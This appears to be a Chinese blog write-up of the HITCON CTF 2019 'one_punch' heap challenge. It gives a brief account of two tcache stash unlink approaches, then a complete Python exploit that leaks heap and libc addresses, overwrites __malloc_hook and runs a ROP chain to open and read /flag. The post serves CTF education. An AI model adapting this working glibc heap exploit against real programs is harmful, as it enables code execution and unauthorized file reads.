# hitcon_ctf_2019_one_punch



### 总结

仍然是`tcache stash unlink`的利用，这里总结两种思路：

- 任意地址分配时，先放`5`个，然后再凑`2`个出来
- 写堆地址的时候，放`6`个，伪造一下`bk`即可

<!-- more -->

### 利用思路

只有`punch`分支才能用`malloc`，其他分支都是`calloc`，因此要想办法使得`punch`的条件成立，即`tcaceh bin[0x220]`的个数要大于`6`。因此有两种思路：

##### 思路1

任意地址分配，分配到`malloc_hook`上方，然后利用一些`gadget`进行`rop`。

![image-20210821143405490](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210821143405490.png)

##### 思路2

错位往`tcahebin[0x220]`的`count`位置，写入`0x7f`，即可绕过校验。

![image-20210821143610022](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210821143610022.png)

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

pop_rdi_ret = 0x26542
pop_rsi_ret = 0x26f9e
pop_rdx_ret = 0x12bda6
pop_rax_ret = 0x47cf8
syscall_ret = 0xcf6c5


def debut(idx, size, name="a"):
    if isinstance(name, str):
        pad = "a"
    else:
        pad = b"a"
    name = name.ljust(size, pad)
    p.sendlineafter("> ", "1")
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("hero name: ", name)


def rename(idx, name):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))
    p.sendafter("hero name: ", name)


def show(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("idx: ", str(idx))
    p.recvuntil("hero name: ")
    return u64(p.recvline()[:-1].ljust(8, b"\x00"))


def retire(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter("idx: ", str(idx))



def punch(data):
    p.sendlineafter("> ", "50056")
    p.send(data)
    p.recvuntil("Serious Punch!!!\n")
    

# use tcachebin stach unlink, while has 5, to malloc at any address
def attack1():
    debut(0, 0x400)
    retire(0)
    debut(1, 0x400)
    retire(1)

    heap_base_addr = show(1) - 0x260
    log_address("heap_base_addr", heap_base_addr)

    for i in range(5):
        debut(0, 0x400)
        retire(0)
    
    debut(0, 0x400)

    for i in range(5):
        debut(1, 0x210)
        retire(1)
    
    retire(0)
    libc_base_addr = show(0) - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    debut(1, 0x1e0)
    # get smallbin chunk
    debut(1, 0x400)
    payload = flat({
        0: [0, 0x221, heap_base_addr + 0x20b0, libc_base_addr + 0x1e4bf8],
        0x1e0: [0, 0x221, 0xdeadbeef, heap_base_addr + 0x1ed0]
    }, filler="\x00")
    rename(0, payload)

    # to trigger tcache stash unlink
    debut(1, 0x210)

    # to change __malloc_hook
    payload = flat({
        0x20: "/flag\x00\x00\x00",
        0x28: libc_base_addr + 0x99540
    })
    punch(payload)

    layout = [
        libc_base_addr + pop_rdi_ret, # rdi
        libc.sym["__malloc_hook"] - 8,
        libc_base_addr + pop_rsi_ret, # rsi
        0, 
        libc_base_addr + pop_rax_ret, # rax
        2, # open("/flag", 0)
        libc_base_addr + syscall_ret, # syscall
        libc_base_addr + pop_rdi_ret,
        3,
        libc_base_addr + pop_rsi_ret,
        heap_base_addr + 0x400, 
        libc_base_addr + pop_rdx_ret,
        0x30,
        libc_base_addr + pop_rax_ret,
        0, # read
        libc_base_addr + syscall_ret,
        libc_base_addr + pop_rdi_ret,
        1,
        libc_base_addr + pop_rax_ret,
        1, 
        libc_base_addr + syscall_ret
    ]

    debut(1, 0x300, flat(layout))

    p.interactive()


# use tcachebin stach unlink, while has 6, to write heap address at any address
def attack2():
    debut(0, 0x400)
    retire(0)
    debut(1, 0x400)
    retire(1)

    heap_base_addr = show(1) - 0x260
    log_address("heap_base_addr", heap_base_addr)

    for i in range(5):
        debut(0, 0x400)
        retire(0)
    
    debut(0, 0x400)

    for i in range(6):
        debut(1, 0x2f0)
        retire(1)
    
    debut(2, 0x210)
    retire(2)
    # stop()

    retire(0)
    libc_base_addr = show(0) - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    debut(1, 0x100)
    # get smallbin chunk
    debut(1, 0x400)
    payload = flat({
        0: [0, 0x301, heap_base_addr + 0x1fd0, heap_base_addr + 0x20 - 5],
        0x100: [0, 0x301, 0xdeadbeef, heap_base_addr + 0x1ed0]
    }, filler="\x00")
    rename(0, payload)

    # to trigger tcache stash unlink
    debut(1, 0x2f0)


    rename(2, p64(libc.sym['__malloc_hook']-8))

    punch("a" * 0x60)

    punch(b"/flag\x00\x00\x00" + p64(libc_base_addr + 0x8cfd6)) # add rsp 0x48; ret

    layout = [
        libc_base_addr + pop_rdi_ret, # rdi
        libc.sym["__malloc_hook"] - 8,
        libc_base_addr + pop_rsi_ret, # rsi
        0, 
        libc_base_addr + pop_rax_ret, # rax
        2, # open("/flag", 0)
        libc_base_addr + syscall_ret, # syscall
        libc_base_addr + pop_rdi_ret,
        3,
        libc_base_addr + pop_rsi_ret,
        heap_base_addr + 0x400, 
        libc_base_addr + pop_rdx_ret,
        0x30,
        libc_base_addr + pop_rax_ret,
        0, # read
        libc_base_addr + syscall_ret,
        libc_base_addr + pop_rdi_ret,
        1,
        libc_base_addr + pop_rax_ret,
        1, 
        libc_base_addr + syscall_ret
    ]

    debut(1, 0x300, flat(layout))

    p.interactive()


attack2()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-21-hitcon-ctf-2019-one-punch/  

